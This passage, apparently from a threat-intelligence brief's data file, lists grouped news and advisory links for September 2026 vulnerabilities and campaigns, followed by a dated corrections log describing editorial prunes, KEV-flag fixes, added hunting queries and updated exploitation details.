    "label": "Forbes — Google update for actively exploited Chrome security flaw confirmed",
    "url": "https://www.forbes.com/sites/daveywinder/2026/09/04/google-update-for-actively-exploited-chrome-security-flaw-confirmed/"
   },
   {
    "label": "CISA — Known Exploited Vulnerabilities catalog",
    "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
   },
   {
    "label": "securityonline.info — Daily CyberSecurity (CVE-2026-85046 listing)",
    "url": "https://securityonline.info/"
   }
  ]
 },
 {
  "group": "Super Forms and Elementor Pro mass exploitation — Sep 4–5, 2026",
  "links": [
   {
    "label": "The Hacker News — Over 440,000 exploit attempts target Super Forms and Elementor Pro RCE flaws",
    "url": "https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html"
   },
   {
    "label": "GBHackers — Critical Super Forms WordPress flaw actively exploited",
    "url": "https://gbhackers.com/critical-super-forms-wordpress-flaw-actively-exploited/"
   },
   {
    "label": "Cyberpress — Hackers exploit critical Super Forms WordPress flaw",
    "url": "https://cyberpress.org/hackers-exploit-critical-super-forms-wordpress-flaw/"
   },
   {
    "label": "securityonline.info — Super Forms CVE-2026-14894 RCE",
    "url": "https://securityonline.info/super-forms-cve-2026-14894-rce/"
   },
   {
    "label": "Patchstack — Super Forms unauthenticated arbitrary file upload",
    "url": "https://patchstack.com/database/wordpress/plugin/super-forms/vulnerability/wordpress-super-forms-drag-drop-form-builder-plugin-6-3-313-unauthenticated-arbitrary-file-upload-vulnerability"
   }
  ]
 },
 {
  "group": "Node.js runtime abuse / Woodgnat — Sep 3–4, 2026",
  "links": [
   {
    "label": "Symantec (security.com) — Node.js: old technique makes a comeback",
    "url": "https://www.security.com/threat-intelligence/node-js-returns-ransomware"
   },
   {
    "label": "The Hacker News — Attackers turn trusted Node.js runtime into malware delivery tool",
    "url": "https://thehackernews.com/2026/09/attackers-turn-trusted-nodejs-runtime.html"
   },
   {
    "label": "OffSeq Threat Radar — Node.js: old technique makes a comeback",
    "url": "https://radar.offseq.com/threat/nodejs-old-technique-makes-a-comeback-1fe82d90a064755d"
   }
  ]
 },
 {
  "group": "Manchester Airports Group / FulcrumSec — Aug 27 – Sep 4, 2026",
  "links": [
   {
    "label": "SecurityWeek — MAG data on 8.8 million people leaked after ransom refusal",
    "url": "https://www.securityweek.com/manchester-airports-group-data-on-8-8-million-people-leaked-after-ransom-refusal/"
   },
   {
    "label": "BleepingComputer — FulcrumSec claims Manchester Airports hack, theft of 86 GB of data",
    "url": "https://www.bleepingcomputer.com/news/security/fulcrumsec-claims-manchester-airports-hack-theft-of-86-gb-of-data/"
   },
   {
    "label": "Computer Weekly — UK airport hackers leak stolen customer data",
    "url": "https://www.computerweekly.com/news/366649824/UK-airport-hackers-leak-stolen-customer-data"
   },
   {
    "label": "Cybernews — UK airport data breach: hackers publish nearly 9M traveler records",
    "url": "https://cybernews.com/security/hackers-publish-sensitive-data-of-nearly-9m-uk-travelers-manchester-airports/"
   }
  ]
 },
 {
  "group": "All-in-One WP Migration CVE-2026-19949 — Sep 2–3, 2026",
  "links": [
   {
    "label": "BleepingComputer — WordPress backup plugin flaw exposes millions of sites to takeover attacks",
    "url": "https://www.bleepingcomputer.com/news/security/wordpress-backup-plugin-flaw-exposes-millions-of-sites-to-takeover-attacks/"
   },
   {
    "label": "SC Media — SQL injection vulnerability in WordPress plugin affects millions of sites",
    "url": "https://www.scworld.com/brief/sql-injection-vulnerability-in-wordpress-plugin-affects-millions-of-sites"
   },
   {
    "label": "GBHackers — WordPress plugin flaw lets attackers turn SQL injection into complete site takeover",
    "url": "https://gbhackers.com/wordpress-plugin-flaw-5/"
   },
   {
    "label": "SOCRadar CVE Radar — CVE-2026-19949",
    "url": "https://socradar.io/free-tools/cve-radar/CVE-2026-19949"
   },
   {
    "label": "SentinelOne vulnerability database — CVE-2026-19949",
    "url": "https://www.sentinelone.com/vulnerability-database/cve-2026-19949/"
   }
  ]
 },
 {
  "group": "BraZetsu / Exilware — Group-IB, Sep 1–3, 2026",
  "links": [
   {
    "label": "Group-IB — Anatomy of BraZetsu: How Cybercriminals Fuel the Underground Ecosystem",
    "url": "https://www.group-ib.com/blog/brazetsu-ai-enhanced-iab-marketplace/"
   },
   {
    "label": "The Hacker News — BraZetsu malware turns compromised Windows hosts into criminal marketplace inventory",
    "url": "https://thehackernews.com/2026/09/brazetsu-malware-turns-compromised.html"
   },
   {
    "label": "GBHackers — AI-enhanced BraZetsu malware powers underground market selling access to corporate networks",
    "url": "https://gbhackers.com/ai-enhanced-brazetsu-malware/"
   }
  ]
 },
 {
  "group": "Cisco Nexus 9000 CVE-2026-20212 — final advisory detail, Sep 3–4, 2026",
  "links": [
   {
    "label": "SOC Prime — CVE-2026-20212: Critical Cisco Nexus 9000 RCE",
    "url": "https://socprime.com/blog/cve-2026-20212-analysis/"
   },
   {
    "label": "Cyber Press — Critical Cisco Nexus 9000 flaw lets unauthenticated attackers execute code as root",
    "url": "https://cyberpress.org/critical-cisco-nexus-9000-flaw/"
   }
  ]
 },
 {
  "group": "JFrog Artifactory CVE-2026-82329 — exploitation follow-up, Sep 2–3, 2026",
  "links": [
   {
    "label": "SOC Prime — CVE-2026-82329: Critical JFrog Artifactory flaw",
    "url": "https://socprime.com/blog/cve-2026-82329-analysis/"
   },
   {
    "label": "SOCRadar — JFrog Artifactory CVE-2026-82329 exploited",
    "url": "https://socradar.io/blog/jfrog-artifactory-cve-2026-82329/"
   },
   {
    "label": "Cyber Security News — JFrog Artifactory auth bypass exploited in attacks to gain admin access",
    "url": "https://cybersecuritynews.com/jfrog-artifactory-auth-bypass-exploited/"
   }
  ]
 },
 {
  "group": "Cisco — September 2026 advisory set",
  "links": [
   {
    "label": "Cisco PSIRT — IOS XR Software Security Hardening Release: September 2026",
    "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hardening-iosxr-qg64NcM"
   },
   {
    "label": "Cisco PSIRT — Advance Notification for September 2, 2026 advisories",
    "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-notice-f2SiMFxl"
   },
   {
    "label": "SecurityWeek — Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities",
    "url": "https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/"
   },
   {
    "label": "The Hacker News — Critical Cisco Nexus 9000 Flaw Lets Unauthenticated Remote Attackers Run Code as Root",
    "url": "https://thehackernews.com/2026/09/critical-cisco-nexus-9000-flaw-lets.html"
   },
   {
    "label": "securityonline.info — Cisco Fixes Critical Cisco IOS XR Vulnerabilities",
    "url": "https://securityonline.info/cisco-ios-xr-vulnerabilities/"
   }
  ]
 },
 {
  "group": "CISA KEV — seven additions, Sep 2, 2026",
  "links": [
   {
    "label": "CISA — CISA Adds Seven Known Exploited Vulnerabilities to Catalog",
    "url": "https://www.cisa.gov/news-events/alerts/2026/09/02/cisa-adds-seven-known-exploited-vulnerabilities-catalog"
   },
   {
    "label": "CISA — Known Exploited Vulnerabilities Catalog",
    "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
   },
   {
    "label": "The Hacker News — CISA Adds Seven Exploited Flaws as Attackers Deploy Reverse Shells and Crypto Miners",
    "url": "https://thehackernews.com/2026/09/cisa-adds-seven-exploited-flaws-as.html"
   }
  ]
 },
 {
  "group": "Sangoma Switchvox — CVE-2026-9586",
  "links": [
   {
    "label": "Horizon3.ai — CVE-2026-9586: Sangoma Switchvox RCE",
    "url": "https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/"
   },
   {
    "label": "BleepingComputer — Hackers exploit Sangoma Switchvox flaw to deploy reverse shells",
    "url": "https://www.bleepingcomputer.com/news/security/hackers-exploit-sangoma-switchvox-flaw-to-deploy-reverse-shells/"
   },
   {
    "label": "Help Net Security — Exploitation of Sangoma Switchvox flaw is underway (CVE-2026-9586)",
    "url": "https://www.helpnetsecurity.com/2026/09/02/exploitation-of-sangoma-switchvox-flaw-underway-cve-2026-9586/"
   },
   {
    "label": "The Hacker News — Attackers Exploit Critical Switchvox Flaw to Deploy Reverse Shells Without Credentials",
    "url": "https://thehackernews.com/2026/09/attackers-exploit-critical-switchvox.html"
   }
  ]
 },
 {
  "group": "Self-hosted AI infrastructure — Wiz and Microsoft telemetry",
  "links": [
   {
    "label": "Wiz Threat Research — Inside 90 days of attacks on AI infrastructure",
    "url": "https://www.wiz.io/blog/ai-infrastructure-honeypot"
   },
   {
    "label": "Microsoft Security Blog — When AI infrastructure becomes a target: securing gateways and control points",
    "url": "https://www.microsoft.com/en-us/security/blog/2026/08/26/when-ai-infrastructure-becomes-target-securing-gateways-control-points/"
   },
   {
    "label": "GHSA-7488-6r32-c95q — LiteLLM MCP authentication bypass (CVE-2026-59822)",
    "url": "https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q"
   },
   {
    "label": "GHSA-86qp-5c8j-p5mr — Starlette host header bypass (CVE-2026-48710)",
    "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr"
   },
   {
    "label": "GHSA-5vc5-wxxq-3fjx — Kestra OSS command injection (CVE-2026-49869)",
    "url": "https://github.com/kestra-io/kestra/security/advisories/GHSA-5vc5-wxxq-3fjx"
   }
  ]
 },
 {
  "group": "PaperCut NG/MF — post-compromise remote access tooling",
  "links": [
   {
    "label": "Help Net Security — Attackers plant remote access tools on compromised PaperCut servers",
    "url": "https://www.helpnetsecurity.com/2026/08/31/papercut-attack-remote-access-tools/"
   },
   {
    "label": "SecurityWeek — PaperCut Exploitation Escalates to Active Intrusions",
    "url": "https://www.securityweek.com/papercut-exploitation-escalates-to-active-intrusions/"
   }
  ]
 },
 {
  "group": "Rockwell Automation and UK policy",
  "links": [
   {
    "label": "Security Boulevard — Daily OT Security News: September 03, 2026",
    "url": "https://securityboulevard.com/2026/09/daily-ot-security-news-september-03-2026/"
   }
  ]
 },
 {
  "group": "SonicWall SMA1000 — CVE-2026-83548 / CVE-2026-83549 zero-days",
  "links": [
   {
    "label": "SonicWall PSIRT — SNWLID-2026-0016",
    "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0016"
   },
   {
    "label": "SecurityWeek — SonicWall Warns of Two SMA1000 Zero-Days Exploited in Attacks",
    "url": "https://www.securityweek.com/sonicwall-warns-of-two-sma1000-zero-days-exploited-in-attacks/"
   },
   {
    "label": "Rapid7 — Critical SonicWall SMA1000 Vulnerabilities CVE-2026-83548, CVE-2026-83549 Exploited in the Wild",
    "url": "https://www.rapid7.com/blog/post/etr-critical-sonicwall-sma1000-vulnerabilities-cve-2026-83548-cve-2026-83549-exploited-in-the-wild/"
   }
  ]
 },
 {
  "group": "JFrog Artifactory — CVE-2026-82329 authentication bypass",
  "links": [
   {
    "label": "JFrog — security advisories (CVE-2026-82329)",
    "url": "https://docs.jfrog.com/releases/docs/jfrog-security-advisories#cve-2026-82329---potential-authentication-bypass-leading-to-administrative-access-in-artifactory"
   },
   {
    "label": "SecurityWeek — Critical JFrog Artifactory Vulnerability Reportedly Exploited in the Wild",
    "url": "https://www.securityweek.com/critical-jfrog-artifactory-vulnerability-reportedly-exploited-in-the-wild/"
   },
   {
    "label": "watchTowr — in-the-wild exploitation observation",
    "url": "https://x.com/watchtowrcyber/status/2094639075726668267"
   }
  ]
 },
 {
  "group": "Langflow — CVE-2026-0768 exploited for credential harvesting",
  "links": [
   {
    "label": "SecurityWeek — Hackers Start Exploiting Critical Langflow Vulnerability",
    "url": "https://www.securityweek.com/hackers-start-exploiting-critical-langflow-vulnerability/"
   },
   {
    "label": "VulnCheck — Pwning the AI Stack",
    "url": "https://www.vulncheck.com/blog/pwning-the-ai-stack"
   },
   {
    "label": "ZDI-26-034 — advisory",
    "url": "https://www.zerodayinitiative.com/advisories/ZDI-26-034/"
   },
   {
    "label": "NVD — CVE-2026-0768",
    "url": "https://nvd.nist.gov/vuln/detail/cve-2026-0768"
   }
  ]
 },
 {
  "group": "Virtualizor — BGP hijack and malicious update package",
  "links": [
   {
    "label": "Virtualizor — Security incident: BGP hijacking",
    "url": "https://www.virtualizor.com/blog/security-incident-bgp-hijacking/"
   },
   {
    "label": "SecurityWeek — Malicious Virtualizor Update Served via BGP Hijacking",
    "url": "https://www.securityweek.com/malicious-virtualizor-update-served-via-bgp-hijacking/"
   }
  ]
 },
 {
  "group": "WatchGuard — Fireware OS iked critical vulnerabilities",
  "links": [
   {
    "label": "SecurityWeek — WatchGuard Patches Critical Vulnerabilities",
    "url": "https://www.securityweek.com/watchguard-patches-critical-vulnerabilities/"
   }
  ]
 },
 {
  "group": "OpenAI Astra — critical cyber capability threshold",
  "links": [
   {
    "label": "SecurityWeek — OpenAI's Astra Crosses 'Critical' Cyber Threshold After Finding Zero-Days",
    "url": "https://www.securityweek.com/openais-astra-becomes-first-model-to-cross-critical-cybersecurity-threshold/"
   },
   {
    "label": "SecurityWeek — JFrog Zero-Days Exploited in OpenAI Hugging Face Hack",
    "url": "https://www.securityweek.com/jfrog-zero-days-exploited-in-openai-hugging-face-hack/"
   }
  ]
 },
 {
  "group": "CISA KEV — Aug 31, 2026 additions (PaperCut)",
  "links": [
   {
    "label": "CISA — CISA Adds Two Known Exploited Vulnerabilities to Catalog (Aug 31, 2026)",
    "url": "https://www.cisa.gov/news-events/alerts/2026/08/31/cisa-adds-two-known-exploited-vulnerabilities-catalog"
   },
   {
    "label": "SecurityWeek — PaperCut Exploitation Escalates to Active Intrusions",
    "url": "https://www.securityweek.com/papercut-exploitation-escalates-to-active-intrusions/"
   }
  ]
 },
 {
  "group": "Iran-linked OT intrusions — UK power plant and US water sector",
  "links": [
   {
    "label": "Security Affairs — UK power plant disabled for four days by Iran-linked hackers",
    "url": "https://securityaffairs.com/197734/cyber-warfare-2/uk-power-plant-disabled-for-four-days-by-iran-linked-hackers-concurrent-with-us-water-attacks.html"
   },
   {
    "label": "SC Media — Iran-linked hackers target UK power plant and US water infrastructure",
    "url": "https://www.scworld.com/brief/iran-linked-hackers-target-uk-power-plant-and-us-water-infrastructure"
   },
   {
    "label": "Fox News — Iran-linked hackers suspected in UK power-plant shutdown after alleged Minnesota water attack",
    "url": "https://www.foxnews.com/politics/iran-linked-hackers-suspected-uk-power-plant-shutdown-alleged-minnesota-water-attack.amp"
   }
  ]
 },
 {
  "group": "PaperCut NG/MF zero-day — CVE-2026-82078 / CVE-2026-81578",
  "links": [
   {
    "label": "PaperCut — Urgent security advisory, Aug 27, 2026",
    "url": "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/"
   },
   {
    "label": "Huntress — PaperCut actively exploited",
    "url": "https://www.huntress.com/blog/papercut-actively-exploited"
   },
   {
    "label": "The Hacker News — Attackers chain two PaperCut flaws to execute code without authentication",
    "url": "https://thehackernews.com/2026/08/attackers-chain-two-papercut-flaws-to.html"
   },
   {
    "label": "The Hacker News — PaperCut zero-day exploited in attacks, affecting all NG and MF versions",
    "url": "https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html"
   }
  ]
 },
 {
  "group": "ZBT router factory implants — SPEAKINGSTONE and DARKLANTERN",
  "links": [
   {
    "label": "VulnCheck — ZBT DARKLANTERN and SPEAKINGSTONE supply chain research",
    "url": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "label": "VulnCheck advisory — zbtlink mqwrt infosrvd command injection (DARKLANTERN)",
    "url": "https://www.vulncheck.com/advisories/zbtlink-mqwrt-infosrvd-command-injection"
   },
   {
    "label": "VulnCheck advisory — zbtlink mqwrt yunmgrd cloud C2 implant (SPEAKINGSTONE)",
    "url": "https://www.vulncheck.com/advisories/zbtlink-mqwrt-yunmgrd-cloud-c2-implant"
   },
   {
    "label": "The Hacker News — China-made ZBT routers ship with two implants giving unauthenticated attackers root access",
    "url": "https://thehackernews.com/2026/08/china-made-zbt-routers-ship-with-two.html"
   }
  ]
 },
 {
  "group": "NovaCookies AiTM phishing-as-a-service",
  "links": [
   {
    "label": "Island Security Research — NovaCookies at scale: inside the $320 phishing service",
    "url": "https://www.island.io/blog/novacookies-at-scale-inside-the-320-phishing-service-targeting-hundreds-of-organizations"
   },
   {
    "label": "Island — companion IOC release (755 domains)",
    "url": "https://github.com/island-io/island-security-research-artifacts/tree/main/novacookies"
   },
   {
    "label": "Microsoft Security Blog — OAuth redirection abuse enables phishing and malware delivery",
    "url": "https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/"
   }
  ]
 },
 {
  "group": "Microsoft Defender — ShieldBreak (CVE-2026-69414)",
  "links": [
   {
    "label": "BleepingComputer — ShieldBreak Zero-Day",
    "url": "https://www.bleepingcomputer.com/news/security/new-microsoft-defender-shieldbreak-zero-day-grants-system-privileges/"
   },
   {
    "label": "Qualys — ShieldBreak No Patch CISA BOD 26-04",
    "url": "https://blog.qualys.com/product-tech/2026/08/20/shieldbreak-the-windows-defender-zero-day-with-no-patch-detect-it-mitigate-it-with-qualys"
   },
   {
    "label": "Kevin Beaumont — ShieldBreak KQL",
    "url": "https://github.com/GossiTheDog/ThreatHunting/blob/master/AdvancedHuntingQueries/ShieldBreak.kql"
   }
  ]
 }
],
  CORRECTIONS: [
 {
  "date": "Sep 8, 2026",
  "item": "Readability pass — long prose blocks broken into paragraphs",
  "was": "Story bodies and assessments rendered as a single unbroken block of prose, in one case 3,000-plus characters at a 88-character measure, and a dozen individual sentences ran past 430 characters with facts stacked behind semicolons",
  "now": "The dashboard now splits story bodies and assessments into paragraphs at sentence boundaries, packing to roughly 300 characters so paragraphs come out an even size, with the measure narrowed to 70 characters and line height raised to 1.78. Thirteen over-long sentences across eleven stories were split into shorter ones; every fact, figure and quotation is unchanged, only the sentence boundaries moved. Paragraph length across the brief now runs to a median of 321 characters with three paragraphs above 460. In a second pass the seven Overview posture rows over 600 characters — Patch Tuesday, StyleSmuggler, PostGREShell, All-in-One WP Migration, BraZetsu, the Cisco September set and PaperCut, two of them over 900 — were split into two to four sentences each at their existing semicolon and em-dash joins, since each had been written as one continuous sentence that the paragraph splitter could not break. POSTURE.text was regenerated from lead plus lines. A third pass restructured every remaining single-sentence Overview row over about 330 characters — 30 of the 33 rows in total — into two to four sentences at their existing semicolon, colon and em-dash joins, and the Overview now renders each row as paragraphs rather than one block. Two rows also had \"a Sep 5 federal deadline that falls today\" corrected to \"that has now passed\", since that wording was written on Sep 5 and the brief is now dated Sep 8",
  "why": "The single-block rendering made the detail unreadable at length. No content was rewritten or removed — the change is sentence punctuation plus typography."
 },
 {
  "date": "Sep 8, 2026",
  "item": "Two stories dropped as older than two weeks with no further developments",
  "was": "35 stories, including GitLab CVE-2026-19478 (emergency patch Aug 17, exploitation reported from Aug 17) and the TheHatman Azure/Entra ID BreachForums listings (posted Aug 1–10, never verified)",
  "now": "33 stories. Both records were removed together with their CVE rows, detail and metadata records, source groups and Overview rows. Key judgment 08 was rewritten: it had cited the Azure/Entra enumeration campaign and Mirage2FA as companions to NovaCookies, and both are now out of the brief, so the judgment now rests on NovaCookies' own multi-factor handling instead. POSTURE.lead was also corrected from \"seven of them new\" to \"six of them new and one updated\" — falconflank carries the updated badge, not new, so the count in the lead did not match the header",
  "why": "Both are more than two weeks old with no new developments: the GitLab flaw was patched as a drop-in on Aug 17 with no reported activity since, and the Azure/Entra listings remained unverified with no corroboration from any named organisation. ShieldBreak (CVE-2026-69414, PoC public Aug 12) is the same age and was kept — Microsoft has still not shipped a patch, so it is retained under the awaiting-a-fix rule."
 },
 {
  "date": "Sep 8, 2026",
  "item": "Daily refresh — Microsoft September 2026 Patch Tuesday added",
  "was": "34 stories; no Patch Tuesday record for September",
  "now": "35 stories. Added patchtuesdaysep with nine CVE rows, covering the two exploited zero-days (CVE-2026-85880 in Windows ALPC and CVE-2026-81963 in the Windows Update Stack, both CVSS 7.8, both rated Important), the five ZDI-flagged server-side entries, and the two CVSS 10.0 Azure flaws. Three hunting queries were written for the exploitation primitives, priority-CVE exposure and deployment state. Headline counts are recorded as a range (966–996 CVEs, 105–121 Critical) with each outlet's basis stated, rather than a single figure. A key judgment was added and the set renumbered; POSTURE gained a row and the lead was updated to 35 stories, seven new",
  "why": "Daily refresh for Tue Sep 8. Counts differ materially between outlets according to whether the 204 cloud fixes released earlier in the month and 25 republished non-Microsoft CVEs are included, and the Office split is reported as both 111 and 222 — recorded as a discrepancy rather than resolved silently."
 },
 {
  "date": "Sep 8, 2026",
  "item": "Hunting queries added for three stories that had none",
  "was": "kevsep02, rockwellsep and hpeaoscx carried a note explaining that no query applied, on the grounds that there were no indicators to hunt",
  "now": "Each now carries queries answering the exposure question rather than the indicator question: a KEV-batch reconciliation over DeviceTvmSoftwareVulnerabilities joined to the federal deadlines plus a discovery pass for the engineering-owned products in the batch; a Rockwell exposure count with an access view over the engineering workstations that reach the controllers; and, for AOS-CX, a syslog view of management-plane authentication and configuration change plus a firewall check on management-interface reachability. Each still states plainly that it is not a detection for the CVE. The query total moves from 72 to 78",
  "why": "Absence of indicators does not mean absence of a useful query — for patch-and-deadline stories the answerable question is which hosts are exposed and who can reach them. magleak, astracyber and ukcsrb still carry no queries: the first ran entirely through a third party's API with valid credentials, and the other two are research and policy items with no telemetry to query."
 },
 {
  "date": "Sep 8, 2026",
  "item": "Overview posture list rebuilt to one row per story, plus three metadata repairs",
  "was": "POSTURE.lines held seven entries for 34 stories, with nineteen carried stories compressed into a single \"Carried over and still live\" row that named them without giving any of them a finding or a remediation. Separately, aiinfra carried a META CVSS of 10 against its own CVE row's published 8.7; novacookies, papercut and zbtimplants had no severity value; and novacookies carried a CVSS of 0 rather than no score",
  "now": "One row per story, 34 in total, in the same order as the story list — carried stories reuse their previously published wording verbatim, and the eleven that had never had a row (Chrome CVE-2026-85046, Langflow, Virtualizor, WatchGuard iked, OpenAI Astra, the Iran-linked OT activity, NovaCookies, the ZBT factory implants, GitLab CVE-2026-19478, the TheHatman Azure/Entra listings and ShieldBreak) now have one. POSTURE.lead was rewritten to describe the shape and count of the list that follows, and POSTURE.text regenerated from lead plus lines. aiinfra META CVSS corrected to 8.7 to match its published row; severity set for novacookies (3), papercut (5) and zbtimplants (4); novacookies CVSS changed from 0 to no score so it renders as a campaign row",
  "why": "The one-row-per-story rule exists so that no live story reaches the reader without a finding and an action. The lumped row broke that for more than half the brief. No assessment changed — the CVSS correction aligns the record with the score already published on the row."
 },
 {
  "date": "Sep 7, 2026",
  "item": "Vulnerabilities tab — KEV flags recorded in prose but not in the flag field",
  "was": "Eleven CISA KEV-listed CVE rows carried the listing only as text inside their description, so the header KEV counter read 1 — and that single match was zbtimplants CVE-2026-74233, flagged \"Exploited (VulnCheck KEV)\", which is VulnCheck's catalog rather than CISA's",
  "now": "A KEV flag was added to all eleven CISA-listed rows (Chrome CVE-2026-85046; Kestra CVE-2026-49869; LiteLLM CVE-2026-59822 and CVE-2026-42271; Starlette CVE-2026-48710; SonicWall CVE-2026-83548 and CVE-2026-83549; JFrog CVE-2026-82329; Switchvox CVE-2026-9586; PaperCut CVE-2026-82078 and CVE-2026-81578), and the ZBT row now reads \"Exploited (VulnCheck)\" so it no longer implies a CISA listing. The KEV counter reads 11",
  "why": "Pre-existing inconsistency between the flag field and the row descriptions; the Monday prune removed the four rows that had been carrying real KEV flags, which exposed it."
 },
 {
  "date": "Sep 7, 2026",
  "item": "Monday rollover — week rolled to Sep 7–13, 16 stories pruned, 5 added, 1 updated",
  "was": "45 stories covering the week of Aug 31 – Sep 6, 2026",
  "now": "34 stories covering the week of Sep 7 – Sep 13, 2026. Dropped as aged out, patched and quiet, or past their federal deadline with no ongoing exploitation: Berlin/Rhysida, McKesson, Boston Scientific, Citrix NetScaler CVE-2026-8452, the Aug 26 legacy KEV batch, VMware vCenter, Gitea CVE-2026-60004, Oracle WebLogic CVE-2026-21962, Mirage2FA, the DPRK Rust crate compromise, TrueConf, macOS Screen Sharing, PTC Windchill/Cl0p, the August Patch Tuesday roundup, the SharePoint CVE-2026-63520 chain and Talos's UAT-10147 research. Key judgments referencing only dropped stories were removed and the remainder renumbered. Badges and META status were reconciled in the same pass: only the five additions carry new, only falconflank carries updated, and all 28 carried stories are marked ongoing.",
  "why": "Monday prune per the standing cadence; no assessment changed, these items aged out."
 },
 {
  "date": "Sep 7, 2026",
  "item": "FalconFlank — scope widened to three Nightmare Eclipse drops, and one vendor now confirms",
  "was": "A single CrowdStrike Falcon PoC with no vendor confirmation, no CVE and no independent reproduction",
  "now": "The same researcher also released PrettyPrague (Avast sandbox, full system privileges) and GreenSection (Nvidia user-mode shared-memory out-of-bounds write). GenDigital confirmed a privilege-escalation vulnerability affecting a subset of Gen products including Avast Antivirus and says it has fixed it; Nvidia had made no statement at publication; CrowdStrike is still investigating FalconFlank. Kevin Beaumont states the Avast, CrowdStrike and Kaspersky exploits work — the first third-party confirmation that the code functions. Admiralty rating moved from C3 to B2.",
  "why": "Vendor confirmation from Gen and independent verification from a named researcher raise the evidentiary standing above a single unverified research claim."
 },
 {
  "item": "Vulnerabilities tab — 10 CVE rows rendered without description, score or status",
  "was": "Rows for PostGREShell, the two Linux kernel PoCs, Chrome CVE-2026-85046, the two Super Forms/Elementor flaws, All-in-One WP Migration, and the Node.js abuse, MAG and BraZetsu campaign rows were written with vector/status/cvss field names the table does not read",
  "now": "Converted to the schema the table renders (score plus a combined sub description); a story record mistakenly duplicated into the CVE array was removed. No assessment changed — the underlying detail was always present on each story page"
 },
 {
  "date": "Sep 4, 2026",
  "item": "Cisco Nexus 9000 CVE-2026-20212 — fixed-release table and port numbers now published",
  "was": "The record stated Cisco published no fixed-release table for CVE-2026-20212, leaving an access control list as the practical control, and did not name the affected ports",
  "now": "Cisco's final advisory cisco-sa-n9k-s1-rce-EH8dEtr lists 10 affected Silicon One product identifiers and 45 affected NX-OS releases from 10.3(1) through 10.6(3s), with software updates released and a Live Protect shield for 10.6(3). The exposed ports are TCP 43210 and 43211 in the default Layer 3 VRF, and Cisco TAC found the flaw while investigating a customer support case. The iACL guidance stands as interim cover, but the assessment that no fixed release existed is superseded"
 },
 {
  "date": "Sep 4, 2026",
  "item": "JFrog Artifactory CVE-2026-82329 — post-exploitation now includes account creation",
  "was": "The record described token minting and enumeration, with remediation framed around patching and revoking every access token",
  "now": "watchTowr's follow-up detail adds that in a limited number of attacks the actors created backdoor users for persistent administrative access. Token revocation alone is therefore insufficient; account review since Aug 28, 2026 is required"
 },
 {
  "date": "Sep 3, 2026",
  "item": "SonicWall SMA1000 — component detail and affected models added",
  "was": "The record described two chained zero-days without identifying which interface each affected or which models were in scope",
  "now": "Rapid7's Sep 2 analysis places CVE-2026-83548 in the Appliance Work Place interface as a pre-authentication SSRF and CVE-2026-83549 in the Appliance Management Console as an OS command injection requiring an authenticated administrator and specific system conditions, with SMA1000 6210, 7210 and 8200v affected. Rapid7 also confirms no public PoC, IOCs or attribution as of Sep 2"
 },
 {
  "date": "Sep 3, 2026",
  "item": "SonicWall SMA1000 — now KEV-listed",
  "was": "CISA's KEV catalog held 17 SonicWall flaws as of Sep 2; neither CVE-2026-83548 nor CVE-2026-83549 had been added",
  "now": "Both were added to KEV on Sep 2, 2026 in a seven-flaw batch, with a BOD 26-04 federal remediation deadline of Sep 5, 2026. Guidance is unchanged; the obligation is new"
 },
 {
  "date": "Sep 3, 2026",
  "item": "JFrog Artifactory CVE-2026-82329 — CVSS published and KEV-listed",
  "was": "No CVSS score published in the sources reviewed, and not in KEV as of Sep 2",
  "now": "CISA's Sep 2 KEV entry carries CVSS 9.8 and a federal deadline of Sep 5, 2026, and describes the flaw as improper authentication allowing an unauthenticated attacker with network access to obtain administrative privileges under default configuration. CVE-2026-66384 remains a separate KEV entry with a Sep 10 deadline"
 },
 {
  "date": "Sep 3, 2026",
  "item": "PaperCut — post-exploitation escalated to remote access tooling",
  "was": "Huntress observed discovery-only activity: whoami, ver and tasklist, with no secondary malware, persistence or command-and-control",
  "now": "PaperCut's Aug 30 bulletin extended the indicator list and described the actor enumerating users, privileges and processes before silently installing legitimate remote access software. Help Net Security reports SimpleHelp and AnyDesk on compromised Application Servers; watchTowr describes activity designed to enable internal network access. The earlier reconnaissance-only characterisation no longer holds"
 },
 {
  "date": "Sep 3, 2026",
  "item": "Posture statement — stale prune and carry-over lines removed",
  "was": "The posture rows still stated that thirteen aged-out stories were dropped in the prune, and listed ownCloud CVE-2023-49105 among the items carried over",
  "now": "Twenty-three stories were removed across the two prune passes on Sep 2, and ownCloud was one of the removals in the second pass. Both statements have been corrected"
 },
 {
  "date": "Sep 2, 2026",
  "item": "Second prune pass — carried stories reduced to what is still live",
  "was": "39 stories, including entries carried forward from the week of Aug 24 – Aug 30 that had been patched, closed or aged into research",
  "now": "29 stories. Archived to 2026-W35 and removed from the live brief: ownCloud CVE-2023-49105 (KEV deadline passed Aug 30), Zimbra CVE-2026-73570 (no confirmed exploitation), Ubiquiti bulletin 067, ServiceNow AI Platform, HOOKEDGE/BlueDelta, Nimbus Manticore, GPUThor, the Unit 42 AI malware study, Executive Order 14420 and the QTFY/QScan seizure. Retained: everything still under active exploitation, awaiting a fix, carrying a live federal deadline, or underpinning a current key judgment. The key judgment that paired Zimbra with macOS Screen Sharing now rests on macOS alone"
 },
 {
  "date": "Sep 2, 2026",
  "item": "Monday rollover — week rolled, 13 stories pruned, 6 added",
  "was": "46 stories covering the week of Aug 24 – Aug 30, 2026",
